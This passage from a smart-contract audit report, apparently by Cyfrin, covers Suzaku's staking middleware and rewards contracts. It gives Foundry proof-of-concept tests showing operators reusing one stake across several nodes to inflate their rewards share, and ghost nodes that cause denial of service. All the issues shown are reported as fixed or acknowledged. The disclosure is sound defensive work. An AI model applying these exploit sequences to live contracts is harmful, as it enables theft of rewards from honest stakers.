+   rewardsAmountPerTokenFromEpoch[targetEpoch].set(rewardsToken, existingAmount + rewardsAmount);
}
```

**Suzaku:**
Fixed in commit [a5c4913](https://github.com/suzaku-network/suzaku-core/pull/155/commits/a5c4913f9f73aa9f87e0026f4fac1cade95b8e64).

**Cyfrin:** Verified.


### Rewards distribution DoS due to uncached secondary asset classes

**Description:** The rewards calculation directly accesses the totalStakeCache mapping instead of using the getTotalStake() function with proper fallback logic:

```solidity
function _calculateOperatorShare(uint48 epoch, address operator) internal {
  // code..

  uint96[] memory assetClasses = l1Middleware.getAssetClassIds();
  for (uint256 i = 0; i < assetClasses.length; i++) {
       uint256 totalStake = l1Middleware.totalStakeCache(epoch, assetClasses[i]); //@audit directly accesses totalStakeCache
  }
}
```
Only specific operations trigger caching for secondary asset classes:
```solidity
// @audit following only cache PRIMARY_ASSET_CLASS (asset class 1)
addNode(...) updateStakeCache(getCurrentEpoch(), PRIMARY_ASSET_CLASS)
forceUpdateNodes(...) updateStakeCache(getCurrentEpoch(), PRIMARY_ASSET_CLASS)

// @audit only caches the specific asset class being slashed
slash(epoch, operator, amount, assetClassId) updateStakeCache(epoch, assetClassId)
```
Secondary asset classes (2, 3, etc.) are only cached when:

- Slashing occurs for that specific asset class (infrequent)
- Manual calcAndCacheStakes() calls (requires intervention)

As a result, when rewards distributor calls `distributeRewards`, for the specific asset class ID with uncached stake, `_calculateOperatorShare` leads to a division by zero error.

**Impact:** Rewards distribution fails for affected epochs. It is worthwhile to note that DoS is temporary - manual intervention by calling `calcAndCacheStakes` for specific asset class ID's can fix the DoS error.

**Proof of Concept:** Add the following test to `RewardsTest.t.sol`

```solidity
function test_RewardsDistributionDOS_With_UncachedSecondaryAssetClasses() public {
    uint48 epoch = 1;
    uint256 uptime = 4 hours;

    // Setup stakes for operators normally
    _setupStakes(epoch, uptime);

    // Set totalStakeCache to 0 for secondary asset classes to simulate uncached state
    middleware.setTotalStakeCache(epoch, 2, 0); // Secondary asset class 2
    middleware.setTotalStakeCache(epoch, 3, 0); // Secondary asset class 3

    // Keep primary asset class cached (this would be cached by addNode/forceUpdateNodes)
    middleware.setTotalStakeCache(epoch, 1, 100000); // This stays cached


    // Move to epoch where distribution is allowed (must be at least 2 epochs ahead)
    vm.warp((epoch + 3) * middleware.EPOCH_DURATION());

    // Attempt to distribute rewards - this should fail due to division by zero
    // when _calculateOperatorShare tries to calculate rewards for uncached secondary asset classes
    vm.expectRevert(); // This should revert due to division by zero in share calculation

    vm.prank(REWARDS_DISTRIBUTOR_ROLE);
    rewards.distributeRewards(epoch, 3);
}

```

**Recommended Mitigation:** Consider checking and caching stake for assetIds if it doesn't exist.

```diff solidity
function _calculateOperatorShare(uint48 epoch, address operator) internal {
  // code..

  uint96[] memory assetClasses = l1Middleware.getAssetClassIds();
  for (uint256 i = 0; i < assetClasses.length; i++) {
++       uint256 totalStake = l1Middleware.totalStakeCache(epoch, assetClasses[i]);
++       if (totalStake == 0) {
++            l1Middleware.calcAndCacheStakes(epoch, assetClasses[i]);
++             totalStake = l1Middleware.totalStakeCache(epoch, assetClasses[i]);
++       }
       // code
  }
}
```

**Suzaku:**
Fixed in commit [f76d1f4](https://github.com/suzaku-network/suzaku-core/pull/155/commits/f76d1f44208e9e882047713a8c49d16cccc69e36).

**Cyfrin:** Verified.


### Uptime loss due to integer division in `UptimeTracker::computeValidatorUptime` can make validator lose entire rewards for an epoch

**Description:** `UptimeTracker::computeValidatorUptime` loses validator uptime due to integer division truncation when distributing uptime across multiple epochs. This results in validators losing reward eligibility for uptime they legitimately earned.

```solidity
// UptimeTracker::computeValidatorUptime
// Distribute the recorded uptime across multiple epochs
if (elapsedEpochs >= 1) {
    uint256 uptimePerEpoch = uptimeToDistribute / elapsedEpochs; // @audit integer division
    for (uint48 i = 0; i < elapsedEpochs; i++) {
        uint48 epoch = lastUptimeEpoch + i;
        if (isValidatorUptimeSet[epoch][validationID] == true) {
            break;
        }
        validatorUptimePerEpoch[epoch][validationID] = uptimePerEpoch; // @audit time loss due to precision
        isValidatorUptimeSet[epoch][validationID] = true;
    }
}
```

Integer division in Solidity truncates the remainder:
- `uptimeToDistribute / elapsedEpochs` loses `uptimeToDistribute % elapsedEpochs`
- The lost remainder is never recovered in future calculations
- Each call to `computeValidatorUptime` can lose up to `elapsedEpochs - 1` seconds

This truncation could become a serious issue in edge cases where the uptime is close to the minimum uptime threshold to qualify for rewards. If the truncated uptime is even 1 second less than `minRequiredTime`, the entire rewards for the validator become zero for that epoch.

```solidity
//Rewards.sol
function _calculateOperatorShare(uint48 epoch, address operator) internal {
    uint256 uptime = uptimeTracker.operatorUptimePerEpoch(epoch, operator);
    if (uptime < minRequiredUptime) {
        operatorBeneficiariesShares[epoch][operator] = 0;  // @audit no rewards
        operatorShares[epoch][operator] = 0;
        return;
    }
    // ... calculate rewards normally
}
```
**Impact:** Precision loss due to integer division can make a validator lose entire rewards for an epoch in certain edge cases.

**Proof of Concept:** Add the test to `UptimeTrackerTest.t.sol`

```solidity
 function test_UptimeTruncationCausesRewardLoss() public {


        uint256 MIN_REQUIRED_UPTIME = 11_520;

        console2.log("Minimum required uptime per epoch:", MIN_REQUIRED_UPTIME, "seconds");
        console2.log("Epoch duration:", EPOCH_DURATION, "seconds");

        // Demonstrate how small time lost can have big impact
        uint256 totalUptime = (MIN_REQUIRED_UPTIME * 3) - 2; // 34,558 seconds across 3 epochs
        uint256 elapsedEpochs = 3;
        uint256 uptimePerEpoch = totalUptime / elapsedEpochs; // 11,519 per epoch
        uint256 remainder = totalUptime % elapsedEpochs; // 2 seconds lost

        console2.log("3 epochs scenario:");
        console2.log("  Total uptime:", totalUptime, "seconds (9.6 hours!)");
        console2.log("  Epochs:", elapsedEpochs);
        console2.log("  Per epoch after division:", uptimePerEpoch, "seconds");
        console2.log("  Lost to truncation:", remainder, "seconds");
        console2.log("  Result: ALL 3 epochs FAIL threshold!");


        // Verify
        assertFalse(uptimePerEpoch >= MIN_REQUIRED_UPTIME, "Fails threshold due to truncation");
    }
```

**Recommended Mitigation:** Consider distributing the remaining uptime either evenly to as many epochs as possible or simply distribute it to the latest epoch.

**Suzaku:**
Fixed in commit [6c37d1c](https://github.com/suzaku-network/suzaku-core/pull/155/commits/6c37d1c3791565fcdf6e097e0587d956ac68f676).

**Cyfrin:** Verified.


### Operator can over allocate the same stake to unlimited nodes within one epoch causing weight inflation and reward theft

**Description:** The `AvalancheL1Middleware::addNode()` function is the entry-point an operator calls to register a new P-chain validator.
Before accepting the request the function asks `_getOperatorAvailableStake()` how much of the operators collateral is still free. That helper subtracts only `operatorLockedStake[operator]` from `totalStake`.

```solidity
    function addNode(
        bytes32 nodeId,
        bytes calldata blsKey,
        uint64 registrationExpiry,
        PChainOwner calldata remainingBalanceOwner,
        PChainOwner calldata disableOwner,
        uint256 stakeAmount // optional
    ) external updateStakeCache(getCurrentEpoch(), PRIMARY_ASSET_CLASS) updateGlobalNodeStakeOncePerEpoch {
        ...
        ...

        bytes32 valId = balancerValidatorManager.registeredValidators(abi.encodePacked(uint160(uint256(nodeId))));
        uint256 available = _getOperatorAvailableStake(operator);
        ...
        ...
    }
```


```solidity
    function _getOperatorAvailableStake(
        address operator
    ) internal view returns (uint256) {
        uint48 epoch = getCurrentEpoch();
        uint256 totalStake = getOperatorStake(operator, epoch, PRIMARY_ASSET_CLASS);

        ...
        ...

        uint256 lockedStake = operatorLockedStake[operator];
        if (totalStake <= lockedStake) {
            return 0;
        }
        return totalStake - lockedStake;
    }
```

However, `AvalancheL1Middleware::addNode()` never **increments** `operatorLockedStake` after it decides to use `newStake`.
As long as the call happens in the same epoch `lockedStake` remains 0, so every subsequent call to `addNode()` sees the *full* collateral as still free and can register another validator of maximal weight.
Per-operator stake is therefore double-counted while the epoch is in progress.

Removal of the excess nodes is only possible through `AvalancheL1Middleware::forceUpdateNodes()`, which is gated by `onlyDuringFinalWindowOfEpoch` and can be executed **only after** the epochs `UPDATE_WINDOW` has elapsed.
Because reward accounting (`getOperatorUsedStakeCachedPerEpoch()  getActiveNodesForEpoch()`) snapshots validators at the **start** of the epoch, all the extra nodes created early in the epoch are treated as fully active for the whole rewards period.
The attacker can therefore inflate their weight and capture a disproportionate share of the epochs reward pool.

```solidity
function getActiveNodesForEpoch(
    address operator,
    uint48 epoch
) external view returns (bytes32[] memory activeNodeIds) {
    uint48 epochStartTs = getEpochStartTs(epoch);

    // Gather all nodes from the never-removed set
    bytes32[] memory allNodeIds = operatorNodes[operator].values();

    bytes32[] memory temp = new bytes32[](allNodeIds.length);
    uint256 activeCount;

    for (uint256 i = 0; i < allNodeIds.length; i++) {
        bytes32 nodeId = allNodeIds[i];
        bytes32 validationID =
            balancerValidatorManager.registeredValidators(abi.encodePacked(uint160(uint256(nodeId))));
        Validator memory validator = balancerValidatorManager.getValidator(validationID);

        if (_wasActiveAt(uint48(validator.startedAt), uint48(validator.endedAt), epochStartTs)) {
            temp[activeCount++] = nodeId;
        }
    }

    activeNodeIds = new bytes32[](activeCount);
    for (uint256 j = 0; j < activeCount; j++) {
        activeNodeIds[j] = temp[j];
    }
}
```
**Impact:** * A malicious operator can spin up an unlimited number of validators without added collateral, blowing past intended per-operator limits.
* Reward distribution is skewed: the sum of operator, vault and curator shares exceeds 100 % and honest participants are diluted.

**Proof of Concept:**
```solidity
// 
// PoC: Exploiting the missing stake-locking in addNode()
// 
import {AvalancheL1MiddlewareTest} from "./AvalancheL1MiddlewareTest.t.sol";

import {Rewards}            from "src/contracts/rewards/Rewards.sol";
import {MockUptimeTracker}  from "../mocks/MockUptimeTracker.sol";
import {ERC20Mock}          from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

import {VaultTokenized}     from "src/contracts/vault/VaultTokenized.sol";
import {PChainOwner}        from "@avalabs/teleporter/validator-manager/interfaces/IValidatorManager.sol";

import {console2}           from "forge-std/console2.sol";

contract PoCMissingLockingRewards is AvalancheL1MiddlewareTest {
    //  helpers & globals 
    MockUptimeTracker internal uptimeTracker;   // Simulates uptime records
    Rewards          internal rewards;          // Rewards contract under test
    ERC20Mock        internal rewardsToken;     // Dummy ERC-20 for payouts

    address internal REWARDS_MANAGER_ROLE    = makeAddr("REWARDS_MANAGER_ROLE");
    address internal REWARDS_DISTRIBUTOR_ROLE = makeAddr("REWARDS_DISTRIBUTOR_ROLE");

    // Main exploit routine ----------------------------------------------------
    function test_PoCRewardsManipulated() public {
        _setupRewards();                                      // 1. deploy & fund rewards system
        address[] memory operators = middleware.getAllOperators();

        // --- STEP 1: move to a fresh epoch ----------------------------------
        console2.log("Warping to a fresh epoch");
        vm.warp(middleware.getEpochStartTs(middleware.getCurrentEpoch() + 1));
        uint48 epoch = middleware.getCurrentEpoch();          // snapshot for later

        // --- STEP 2: create *too many* nodes for Alice ----------------------
        console2.log("Creating 4 nodes for Alice with the same stake");
        uint256 stake1 = 200_000_000_002_000;          // Alice's full stake
        _createAndConfirmNodes(alice, 4, stake1, true);     //  re-uses the same stake 4 times

        // Charlie behaves honestly  one node, fully staked
        console2.log("Creating 1 node for Charlie with the full stake");
        uint256 stake2 = 150_000_000_000_000;
        _createAndConfirmNodes(charlie, 1, stake2, true);

        // --- STEP 3: Remove Alice's unbacked nodes at the earliest possible moment------
        console2.log("Removing Alice's unbacked nodes at the earliest possible moment");
        uint48 nextEpoch = middleware.getCurrentEpoch() + 1;
        uint256 afterUpdateWindow =
            middleware.getEpochStartTs(nextEpoch) + middleware.UPDATE_WINDOW() + 1;
        vm.warp(afterUpdateWindow);
        middleware.forceUpdateNodes(alice, type(uint256).max);

        // --- STEP 4: advance to the rewards epoch ---------------------------
        console2.log("Advancing and caching stakes");
        _calcAndWarpOneEpoch();                               // epoch rollover, stakes cached
        middleware.calcAndCacheStakes(epoch, assetClassId);   // ensure operator stakes cached

        // --- STEP 5: mark everyone as fully up for the epoch ----------------
        console2.log("Marking everyone as fully up for the epoch");
        for (uint i = 0; i < operators.length; i++) {
            uptimeTracker.setOperatorUptimePerEpoch(epoch, operators[i], 4 hours);
        }

        // --- STEP 6: advance a few epochs so rewards can be distributed -------
        console2.log("Advancing 3 epochs so rewards can be distributed ");
        _calcAndWarpOneEpoch(3);

        // --- STEP 7: distribute rewards (attacker gets oversized share) -----
        console2.log("Distributing rewards");
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewards.distributeRewards(epoch, uint48(operators.length));

        // --- STEP 8: verify that the share accounting exceeds 100 % ---------
        console2.log("Verifying that the share accounting exceeds 100 %");
        uint256 totalShares = 0;
        // operator shares
        for (uint i = 0; i < operators.length; i++) {
            totalShares += rewards.operatorShares(epoch, operators[i]);
        }
        // vault shares
        address[] memory vaults = vaultManager.getVaults(epoch);
        for (uint i = 0; i < vaults.length; i++) {
            totalShares += rewards.vaultShares(epoch, vaults[i]);
        }
        // curator shares
        for (uint i = 0; i < vaults.length; i++) {
            totalShares += rewards.curatorShares(epoch, VaultTokenized(vaults[i]).owner());
        }
        assertGt(totalShares, 10000); // > 100 % allocated

        // --- STEP 9: attacker & others claim their rewards ---------
        console2.log("Claiming rewards");
        _claimRewards(epoch);
    }

    // Claim helper  each stakeholder pulls what the Rewards contract thinks
    // they earned (spoiler: the attacker earns too much)
    function _claimRewards(uint48 epoch) internal {
        address[] memory operators = middleware.getAllOperators();
        // claim as operators --------------------------------------------------
        for (uint i = 0; i < operators.length; i++) {
            address op = operators[i];
            vm.startPrank(op);
            if (rewards.operatorShares(epoch, op) > 0) {
                rewards.claimOperatorFee(address(rewardsToken), op);
            }
            vm.stopPrank();
        }
        // claim as vaults / stakers ------------------------------------------
        address[] memory vaults = vaultManager.getVaults(epoch);
        for (uint i = 0; i < vaults.length; i++) {
            vm.startPrank(staker);
            rewards.claimRewards(address(rewardsToken), vaults[i]);
            vm.stopPrank();

            vm.startPrank(VaultTokenized(vaults[i]).owner());
            rewards.claimCuratorFee(address(rewardsToken), VaultTokenized(vaults[i]).owner());
            vm.stopPrank();
        }
        // protocol fee --------------------------------------------------------
        vm.startPrank(owner);
        rewards.claimProtocolFee(address(rewardsToken), owner);
        vm.stopPrank();
    }

    // Deploy rewards contracts, mint tokens, assign roles, fund epochs -------
    function _setupRewards() internal {
        uptimeTracker = new MockUptimeTracker();
        rewards       = new Rewards();

        // initialise with fee splits & uptime threshold
        rewards.initialize(
            owner,                          // admin
            owner,                          // protocol fee recipient
            payable(address(middleware)),   // middleware (oracle)
            address(uptimeTracker),         // uptime oracle
            1000,                           // protocol   10%
            2000,                           // operators  20%
            1000,                           // curators   10%
            11_520                          // min uptime (seconds)
        );

        // set up roles --------------------------------------------------------
        vm.prank(owner);
        rewards.setRewardsManagerRole(REWARDS_MANAGER_ROLE);

        vm.prank(REWARDS_MANAGER_ROLE);
        rewards.setRewardsDistributorRole(REWARDS_DISTRIBUTOR_ROLE);

        // create & fund mock reward token ------------------------------------
        rewardsToken = new ERC20Mock();
        rewardsToken.mint(REWARDS_DISTRIBUTOR_ROLE, 1_000_000 * 1e18);
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewardsToken.approve(address(rewards), 1_000_000 * 1e18);

        // schedule 10 epochs of 100 000 tokens each ---------------------------
        vm.startPrank(REWARDS_DISTRIBUTOR_ROLE);
        rewards.setRewardsAmountForEpochs(1, 10, address(rewardsToken), 100_000 * 1e18);

        // 100 % of rewards go to the primary asset-class (id 1) ---------------
        vm.startPrank(REWARDS_MANAGER_ROLE);
        rewards.setRewardsShareForAssetClass(1, 10000); // 10 000 bp == 100 %
        vm.stopPrank();
    }
}
```
**Output:**
```bash
Ran 1 test for test/middleware/PoCMissingLockingRewards.t.sol:PoCMissingLockingRewards
[PASS] test_PoCRewardsManipulated() (gas: 8408423)
Logs:
  Warping to a fresh epoch
  Creating 4 nodes for Alice with the same stake
  Creating 1 node for Charlie with the full stake
  Removing Alice's unbacked nodes at the earliest possible moment
  Advancing and caching stakes
  Marking everyone as fully up for the epoch
  Advancing 3 epochs so rewards can be distributed
  Distributing rewards
  Verifying that the share accounting exceeds 100 %
  Claiming rewards

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.83ms (2.29ms CPU time)

Ran 1 test suite in 133.94ms (5.83ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

**Recommended Mitigation:** * **Lock stake as soon as a node is created**

  ```solidity
  // inside addNode(), after newStake is finalised
  operatorLockedStake[operator] += newStake;
  ```

  Unlock (subtract) it in `_initializeEndValidationAndFlag()` and whenever `_initializeValidatorStakeUpdate()` lowers the nodes stake.

**Suzaku:**
Fixed in commit [d3f80d9](https://github.com/suzaku-network/suzaku-core/pull/155/commits/d3f80d9d3830deda5012eca6f4356b02ad768868).

**Cyfrin:** Verified.






### DoS on stake accounting functions by bloating `operatorNodesArray` with irremovable nodes

**Description:** When an operator removes a node the intended flow is:

1. `removeNode()` (middleware)
2. `calcAndCacheNodeStakeForAllOperators()` (called immediately or by the `updateGlobalNodeStakeOncePerEpoch` modifier)
   * branch  runs:
     ```solidity
     if (nodePendingRemoval[valID] && ) {
         _removeNodeFromArray(operator,nodeId);
         nodePendingRemoval[valID] = false;
     }
     ```
   * the node is popped from `operatorNodesArray` and its `nodePendingRemoval` flag is cleared
3. `completeValidatorRemoval()` after the P-Chain confirmation arrives (warp message)

If steps 1 and 3 both happen **inside the same epoch** *after* that epochs call to
`calcAndCacheNodeStakeForAllOperators()`, we enter an inconsistent state:

* `completeValidatorRemoval()` executes `_completeEndValidation()` in **BalancerValidatorManager**, which deletes the mapping entry in `._registeredValidators`:
  ```solidity
  delete $._registeredValidators[validator.nodeID];
  ```
* From now on, every call in the next epoch to
  ```solidity
  bytes32 valID =
      balancerValidatorManager.registeredValidators(abi.encodePacked(uint160(uint256(nodeId))));
  ```
  returns `bytes32(0)`.

During `_calcAndCacheNodeStakeForOperatorAtEpoch()` (epoch E + 1):

* `valID == bytes32(0)` so **both** `nodePendingRemoval[valID]` and `nodePendingUpdate[valID]`
  are `false`.
* The special removal branch is skipped, therefore
  `operatorNodesArray` **still contains the stale `nodeId`** forever.
* No other house-keeping step ever removes it, because the sentinel `valID`
  can no longer be reconstructed.

The node is now impossible to remove or update, Operators can repeat the sequence to add *unlimited* ghost nodes and inflate `operatorNodesArray`. All O(n) loops over that array (e.g. `forceUpdateNodes`, `_calcAndCacheNodeStakeForAllOperators`, many view helpers) grow without bound, eventually exhausting block gas or causing permanent **DoS** for that operator and, indirectly, for protocol-wide maintenance functions.


**Impact:** Oversized arrays make epoch-maintenance and stake-rebalance functions revert on out-of-gas. Stake updates, slashing, reward distributions and emergency withdrawals depending on them can be frozen.

**Proof of Concept:**
```solidity
// 
// PoC  Phantom / Irremovable Node
// Shows how a node can be removed *logically* on the P-Chain yet remain stuck
// inside `operatorNodesArray`, blowing up storage & breaking future logic.
// 
import {AvalancheL1MiddlewareTest} from "./AvalancheL1MiddlewareTest.t.sol";
import {PChainOwner}              from "@avalabs/teleporter/validator-manager/interfaces/IValidatorManager.sol";
import {StakeConversion}          from "src/contracts/middleware/libraries/StakeConversion.sol";
import {console2}                 from "forge-std/console2.sol";

contract PoCIrremovableNode is AvalancheL1MiddlewareTest {

    /// Demonstrates *expected* vs *buggy* behaviour side-by-side
    function test_PoCIrremovableNode() public {

        // 
        // 1)  NORMAL FLOW  node can be removed
        // 
        console2.log("=== NORMAL FLOW ===");
        vm.startPrank(alice);

        // Create a fresh nodeId so it is unique for Alice
        bytes32 nodeId = keccak256(abi.encodePacked(alice, "node-A", block.timestamp));

        console2.log("Registering nodeA");
        middleware.addNode(
            nodeId,
            hex"ABABABAB",                        // dummy BLS key
            uint64(block.timestamp + 2 days),     // expiry
            PChainOwner({threshold: 1, addresses: new address[](0)}),
            PChainOwner({threshold: 1, addresses: new address[](0)}),
            100_000_000_000_000                   // stake
        );

        // Complete registration on the mock validator manager
        uint32 regMsgIdx = mockValidatorManager.nextMessageIndex() - 1;
        middleware.completeValidatorRegistration(alice, nodeId, regMsgIdx);
        console2.log("nodeA registered");

        // Length should now be 1
        assertEq(middleware.getOperatorNodesLength(alice), 1);

        // Initiate removal
        console2.log("Removing nodeA");
        middleware.removeNode(nodeId);

        vm.stopPrank();

        // Advance 1 epoch so stake caches roll over
        _calcAndWarpOneEpoch();

        // Confirm removal from P-Chain and complete it on L1
        uint32 rmMsgIdx = mockValidatorManager.nextMessageIndex() - 1;
        vm.prank(alice);
        middleware.completeValidatorRemoval(rmMsgIdx);
        console2.log("nodeA removal completed");

        // Now node array should be empty
        assertEq(middleware.getOperatorNodesLength(alice), 0);
        console2.log("NORMAL FLOW success: array length = 0\n");

        // 
        // 2)  BUGGY FLOW  removal inside same epoch  phantom entry
        // 
        console2.log("=== BUGGY FLOW (same epoch) ===");
        vm.startPrank(alice);

        // Re-use *same* nodeId to simulate quick re-registration
        console2.log("Registering nodeA in the SAME epoch");
        middleware.addNode(
            nodeId,                               // same id!
            hex"ABABABAB",
            uint64(block.timestamp + 2 days),
            PChainOwner({threshold: 1, addresses: new address[](0)}),
            PChainOwner({threshold: 1, addresses: new address[](0)}),
            100_000_000_000_000
        );
        uint32 regMsgIdx2 = mockValidatorManager.nextMessageIndex() - 1;
        middleware.completeValidatorRegistration(alice, nodeId, regMsgIdx2);
        console2.log("nodeA (second time) registered");

        // Expect length == 1 again
        assertEq(middleware.getOperatorNodesLength(alice), 1);

        // Remove immediately
        console2.log("Immediately removing nodeA again");
        middleware.removeNode(nodeId);

        // Complete removal *still inside the same epoch* (simulating fast warp msg)
        uint32 rmMsgIdx2 = mockValidatorManager.nextMessageIndex() - 1;
        middleware.completeValidatorRemoval(rmMsgIdx2);
        console2.log("nodeA (second time) removal completed");

        vm.stopPrank();

        // Advance to next epoch
        _calcAndWarpOneEpoch();

        // BUG: array length is STILL 1  phantom node stuck forever
        uint256 lenAfter = middleware.getOperatorNodesLength(alice);
        assertEq(lenAfter, 1, "Phantom node should remain");

        console2.log("BUGGY FLOW reproduced: node is irremovable.");
    }
}
```

**Output**
```bash
Ran 1 test for test/middleware/PoCIrremovableNode.t.sol:PoCIrremovableNode
[PASS] test_PoCIrremovableNode() (gas: 1138657)
Logs:
  === NORMAL FLOW ===
  Registering nodeA
  nodeA registered
  Removing nodeA
  nodeA removal completed
  NORMAL FLOW success: array length = 0

  === BUGGY FLOW (same epoch) ===
  Registering nodeA in the SAME epoch
  nodeA (second time) registered
  Immediately removing nodeA again
  nodeA (second time) removal completed
  BUGGY FLOW reproduced: node is irremovable.

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.31ms (789.96s CPU time)

Ran 1 test suite in 158.79ms (4.31ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
Before running the PoC make sure to add the following line to the `MockBalancerValidatorManager::completeEndValidation` since it exists in the `BalancerValidatorManager` implementation:
```diff
    function completeEndValidation(
        uint32 messageIndex
    ) external override {
        ...
        ...
        // Clean up
        delete pendingRegistrationMessages[messageIndex];
        delete pendingTermination[validationID];
+       delete _registeredValidators[validator.nodeID];
    }
```
- [completeValidatorRemoval](https://github.com/ava-labs/icm-contracts/blob/bd61626c67a7736119c6571776b85db6ce105992/contracts/validator-manager/ValidatorManager.sol#L604-L605)



**Recommended Mitigation:** **Track pending removals by `nodeId`, not by `validationID`**, or store an auxiliary mapping `nodeId  validationID` before deletion so the middleware can still correlate them after `_registeredValidators` is cleared.

**Suzaku:**
Fixed in commit [d4d2df7](https://github.com/suzaku-network/suzaku-core/pull/155/commits/d4d2df784273bc8d4de51e8aabc6aaf06cea6203).

**Cyfrin:** Verified.


\clearpage
## Low Risk


### Missing zero-address validation for burner address during initialization can break slashing

**Description:** The VaultTokenized contract's initialization procedure fails to validate that the burner parameter is a non-zero address. However, the `onSlash` function uses SafeERC20's `safeTransfer` to send tokens to this address, which will revert for most ERC20 implementations if the recipient is address(0).

```solidity
// In _initialize:
vs.burner = params.burner; // No validation that params.burner != address(0)

// In onSlash:
if (slashedAmount > 0) {
    IERC20(vs.collateral).safeTransfer(vs.burner, slashedAmount); // Will revert if vs.burner is address(0)
}
```
While other critical parameters like collateral are validated against the zero address, the burner parameter lacks this check despite its importance in the slashing flow.

**Impact:** Setting burner to `address(0)` would break a core security function (slashing)

**Recommended Mitigation:** Consider adding a zero-address validation for the burner parameter during initialization.

**Suzaku:**
Fixed in commit [4683ab8](https://github.com/suzaku-network/suzaku-core/pull/155/commits/4683ab82c40103fd6af5a7d2447e5be211e93f20).

**Cyfrin:** Verified.


### `BaseDelegator` is not using upgradeable version of `ERC165`

**Description:** The `BaseDelegator` contract currently inherits from the non-upgradeable version of ERC165. This could limit the contract's ability to adapt to future upgrades or modifications of the ERC165 interface, potentially impacting the contract's upgradability and compatibility with other upgradeable contracts. This can lead to issues, as the non-upgradeable version does not have the necessary initializers and storage gap reserved for upgradeable contracts.

**Impact:** Using the non-upgradeable `ERC165` in an otherwise upgradeable contract (`BaseDelegator`) introduces a risk of incompatibility with future upgrades.

**Recommended Mitigation:** Make the following change to the `BaseDelagator`
```diff
- abstract contract BaseDelegator is AccessControlUpgradeable, ReentrancyGuardUpgradeable, IBaseDelegator, ERC165 {
+ abstract contract BaseDelegator is AccessControlUpgradeable, ReentrancyGuardUpgradeable, IBaseDelegator, ERC165Upgradeable {
    using ERC165Checker for address;
```

**Suzaku:**
Acknowledged.

**Cyfrin:** Acknowledged.



### Vault limit cannot be modified if vault Is already enabled

**Description**

The `updateVaultMaxL1Limit` function reverts with `MapWithTimeData__AlreadyEnabled` when attempting to increase or decrease the vault limit if the vault is already enabled. This behavior occurs due to the call to `vaults.enable(vault)` within the function, which fails when the vault is already in an enabled state.

```solidity
function updateVaultMaxL1Limit(address vault, uint96 assetClassId, uint256 vaultMaxL1Limit) external onlyOwner {
    if (!vaults.contains(vault)) {
        revert AvalancheL1Middleware__NotVault(vault);
    }
    if (vaultToAssetClass[vault] != assetClassId) {
        revert AvalancheL1Middleware__WrongVaultAssetClass();
    }

    _setVaultMaxL1Limit(vault, assetClassId, vaultMaxL1Limit);

    if (vaultMaxL1Limit == 0) {
        vaults.disable(vault);
    } else {
        vaults.enable(vault);
    }
}
```

**Impact**

Calling `updateVaultMaxL1Limit` with a non-zero `vaultMaxL1Limit` for an already-enabled vault results in a revert, breaking the expected behavior. The current design requires the vault to be explicitly disabled before setting a new non-zero limit and enabling it again. This workflow is unintuitive and introduces unnecessary friction for the contract owner or administrator.

**Proof of Concept**

The following test will fail due to the described behavior. Add it to the `AvalancheL1MiddlewareTest`:

```solidity
function testUpdateVaultMaxL1Limit() public {
    vm.startPrank(validatorManagerAddress);

    // Attempt to update to a new non-zero limit while vault is already enabled
    vaultManager.updateVaultMaxL1Limit(address(vault), 1, 500 ether);

    vm.stopPrank();
}
```

**Recommended Mitigation**

Consider modifying the logic inside `updateVaultMaxL1Limit` to check the current enabled state before attempting to enable or disable. Only call `vaults.enable(vault)` or `vaults.disable(vault)` if there is an actual state transition.

**Suzaku:**
Fixed in commit [a9f6aaa](https://github.com/suzaku-network/suzaku-core/pull/155/commits/a9f6aaa92bd3800335c4d8085225a23a38c58b34).

**Cyfrin:** Verified.



### Incorrect vault status determination in `MiddlewareVaultManager`

**Description:** The `MiddlewareVaultManager::_wasActiveAt()`  determines whether a vault was active at a specific timestamp. This function is used by the `getVaults()` method to filter active vaults for a given epoch.

The current implementation of `_wasActiveAt()` incorrectly considers a vault to be active at the exact timestamp when it was disabled. The function returns true when:

- The vault has been enabled (enabledTime != 0)
- The vault was enabled at or before the timestamp (enabledTime <= timestamp)
- AND EITHER:
       - The vault was never disabled (disabledTime == 0) OR
       - The vault's disabled timestamp is greater than or equal to the query timestamp (disabledTime >= timestamp)


```solidity
// Current implementation
function _wasActiveAt(uint48 enabledTime, uint48 disabledTime, uint48 timestamp) private pure returns (bool) {
    return enabledTime != 0 && enabledTime <= timestamp && (disabledTime == 0 || disabledTime >= timestamp);
}
```

The issue is with the third condition (`disabledTime >= timestamp`). This logic means that a vault disabled exactly at the timestamp being queried (e.g., at the start of an epoch) would still be considered active for that epoch, which is counterintuitive. Typically, when an entity is disabled at a specific timestamp, it should be considered inactive from that timestamp forward.


**Impact:** Vaults disabled exactly at an epoch boundary to be incorrectly included as active in that epoch.

**Recommended Mitigation:** Consider modifying the `_wasActiveAt()` function to use a strict inequality for the disablement check.

**Suzaku:**
Fixed in commit [9bbbcfc](https://github.com/suzaku-network/suzaku-core/pull/155/commits/9bbbcfce7bedd1dd4e60fdf55bb5f13ba8ab4847).

**Cyfrin:** Verified.


### Missing validation for zero `epochDuration` in AvalancheL1Middleware can break epoch based accounting

**Description:** `AvalancheL1Middleware::EPOCH_DURATION` is an immutable parameter set in the constructor. The current implementation only checks that `slashingWindow` is not less than `epochDuration` but doesn't verify that `epochDuration` itself is greater than zero.

```solidity
constructor(
    AvalancheL1MiddlewareSettings memory settings,
    address owner,
    address primaryAsset,
    uint256 primaryAssetMaxStake,
    uint256 primaryAssetMinStake,
    uint256 primaryAssetWeightScaleFactor
) AssetClassRegistry(owner) {
    // Other validations...

    if (settings.slashingWindow < settings.epochDuration) {
        revert AvalancheL1Middleware__SlashingWindowTooShort(settings.slashingWindow, settings.epochDuration);
    }

    //@audit No check for zero epochDuration!

    START_TIME = Time.timestamp();
    EPOCH_DURATION = settings.epochDuration;
    // Other assignments...
}
```

The check `settings.slashingWindow < settings.epochDuration` will pass as long as slashingWindow is also zero.

**Impact:** Contract functions such as `getEpochAtTs` rely on division by EPOCH_DURATION, which would cause divide-by-zero errors.


**Recommended Mitigation:** Consider adding an explicit validation check for the `epochDuration` parameter in the constructor.

**Suzaku:**
Acknowledged.

**Cyfrin:** Acknowledged.


